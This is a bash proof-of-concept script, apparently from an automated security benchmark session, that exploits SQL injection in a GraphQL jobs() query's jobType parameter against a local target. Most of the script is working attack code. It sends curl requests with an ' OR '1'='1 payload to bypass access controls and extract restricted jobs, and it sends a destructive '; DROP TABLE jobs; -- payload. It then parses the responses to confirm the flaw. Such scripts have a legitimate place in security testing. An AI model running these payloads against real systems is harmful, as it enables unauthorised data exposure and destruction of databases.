#!/bin/bash
# POC: Demonstrates SQL injection in GraphQL jobType parameter that bypasses access controls to retrieve restricted jobs
# Target: ./repo
# Created: 2025-11-10T15:07:34.592Z
# Session: benchmark-XBEN-038-24-mht9rpjz

# GraphQL SQL Injection POC - jobType Parameter
# This script demonstrates SQL injection in the GraphQL jobs() query
# that bypasses access controls to retrieve restricted job information

TARGET="${1:-http://localhost:8000}"
GRAPHQL_ENDPOINT="${TARGET}/graphql/"

echo "=== GraphQL SQL Injection POC - jobType Parameter ==="
echo "Target: $GRAPHQL_ENDPOINT"
echo ""

# Test 1: Normal query - should return public jobs only
echo "[*] Test 1: Normal query with empty jobType (baseline)"
echo "Query: jobs(jobType: \"\") {id name}"
RESPONSE1=$(curl -s -X POST "$GRAPHQL_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"query": "{jobs(jobType: \"\") {id name type}}"}')

echo "Response:"
echo "$RESPONSE1" | jq . 2>/dev/null || echo "$RESPONSE1"
echo ""

# Extract job count from response
JOB_COUNT_NORMAL=$(echo "$RESPONSE1" | jq '.data.jobs | length' 2>/dev/null || echo "0")
echo "[+] Normal query returned $JOB_COUNT_NORMAL jobs"
echo ""

# Test 2: SQL Injection - bypass access control with OR condition
echo "[*] Test 2: SQL Injection with ' OR '1'='1"
echo "Query: jobs(jobType: \"' OR '1'='1\") {id name type description}"
RESPONSE2=$(curl -s -X POST "$GRAPHQL_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"query": "{jobs(jobType: \"'"'"' OR '"'"'1'"'"'='"'"'1\") {id name type description}}"}')

echo "Response:"
echo "$RESPONSE2" | jq . 2>/dev/null || echo "$RESPONSE2"
echo ""

# Extract job count from injected query
JOB_COUNT_INJECTED=$(echo "$RESPONSE2" | jq '.data.jobs | length' 2>/dev/null || echo "0")
echo "[+] Injected query returned $JOB_COUNT_INJECTED jobs"
echo ""

# Check if we got additional jobs (restricted job)
if [ "$JOB_COUNT_INJECTED" -gt "$JOB_COUNT_NORMAL" ]; then
  echo "[!] VULNERABILITY CONFIRMED: Injection returned more jobs than normal query"
  echo "[!] Access control bypassed - restricted jobs exposed"
  
  # Look for restricted job
  RESTRICTED_JOB=$(echo "$RESPONSE2" | jq '.data.jobs[] | select(.type == "restricted")' 2>/dev/null)
  if [ ! -z "$RESTRICTED_JOB" ]; then
    echo "[!] RESTRICTED JOB FOUND:"
    echo "$RESTRICTED_JOB" | jq .
  fi
  VULN_FOUND=1
else
  VULN_FOUND=0
fi
echo ""

# Test 3: SQL Syntax Error confirmation
echo "[*] Test 3: SQL Syntax Error Test - attempting DROP TABLE injection"
echo "Query: jobs(jobType: \"'; DROP TABLE jobs; --\") {id name}"
RESPONSE3=$(curl -s -X POST "$GRAPHQL_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"query": "{jobs(jobType: \"'"'"'; DROP TABLE jobs; --\") {id name}}"}')

echo "Response:"
echo "$RESPONSE3" | jq . 2>/dev/null || echo "$RESPONSE3"
echo ""

# Check for SQL error patterns
if echo "$RESPONSE3" | grep -q "one statement\|syntax error\|SQL\|database error" 2>/dev/null; then
  echo "[!] SQL ERROR DETECTED: Backend confirms SQL query execution"
  echo "[!] This indicates raw SQL concatenation without parameterization"
  VULN_FOUND=1
fi
echo ""

# Final verdict
echo "=== VULNERABILITY ASSESSMENT ==="
if [ "$VULN_FOUND" -eq 1 ]; then
  echo "[CRITICAL] SQL Injection vulnerability confirmed in jobType parameter"
  echo "Severity: CRITICAL - Allows bypass of access controls and data exposure"
  exit 0
else
  echo "[INFO] Could not confirm SQL injection in this environment"
  exit 1
fi